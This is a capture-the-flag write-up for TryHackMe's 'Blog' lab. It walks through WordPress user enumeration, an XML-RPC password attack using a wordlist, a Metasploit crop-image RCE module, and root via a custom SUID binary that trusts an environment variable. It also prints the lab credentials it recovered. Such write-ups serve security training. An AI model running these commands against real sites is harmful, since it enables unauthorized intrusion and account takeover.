# Blog - TryHackMe

Linux machine running a WordPress blog, with SSH and SMB also exposed but neither useful
without credentials. The path runs through WordPress user enumeration, an XML-RPC credential
attack, a known plugin RCE, and a custom SUID binary with a logic flaw.

Target: `10.64.164.200` (`blog.thm`)

---

## Reconnaissance

```bash
nmap -sC -sV 10.64.164.200
```

Three services: SSH (22), HTTP (80), SMB (139/445). Neither SSH nor SMB accept anonymous
access without credentials, so the web application is the way in.

---

## Enumeration

### Web Application

The site doesn't resolve properly by IP - it needs the vhost:

```bash
echo "10.64.164.200 blog.thm" | sudo tee -a /etc/hosts
```

Browsing to `blog.thm` shows a WordPress site. A scan confirms the version and a few issues:

```bash
wpscan --url http://blog.thm -e u,vp
```

- WordPress 5.0 (outdated)
- XML-RPC enabled
- Directory listing enabled on `/wp-content/uploads/`
- Two usernames: `bjoel`, `kwheel`

No plugin gives a direct exploit, so the next step is finding valid credentials for one of
these two users.

### SMB Share

```bash
smbclient -L //10.64.164.200/ -N
```

An anonymous share is readable, holding media files with no obvious secrets - one of the
filenames is the actual hint, pointing toward a password rather than a technical exploit.

### Credential Discovery via XML-RPC

WPScan's XML-RPC password attack, using the two usernames found earlier, returns a working
pair:

```bash
wpscan --url http://blog.thm -U bjoel,kwheel --password-attack xmlrpc -P /usr/share/wordlists/rockyou.txt
```

```
kwheel : cutiepie1
```

---

## Initial Access

With valid WordPress credentials, a known RCE module targeting the crop-image endpoint
works directly:

```bash
use exploit/multi/http/wp_crop_rce
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
run
```

Shell as `www-data`. Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Local Enumeration

`bjoel`'s home directory holds a PDF that isn't the flag - it's a hint pointing toward a
custom binary rather than a standard privilege escalation path.

---

## Privilege Escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

A non-standard SUID binary shows up: `/usr/sbin/checker`. Reversing it shows the logic: it
checks whether an environment variable called `admin` is set, and if so, spawns a root shell.

```bash
export admin=anyvalue
/usr/sbin/checker
```

Root shell. User flag is under `/media/usb/`, root flag under `/root/`.

---

## Key Takeaways

- SSH and SMB being open doesn't mean they're the way in - check the actual web application
  first when one is present.
- WPScan's XML-RPC password attack is faster and quieter than brute-forcing the login page
  directly.
- A "hint" file sitting in an SMB share or home directory is often more valuable than the
  standard SUID/sudo checklist - look for it before running the usual privesc scripts.
- Custom SUID binaries are worth reversing: environment-variable checks like this one are a
  common and easy-to-miss logic flaw.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
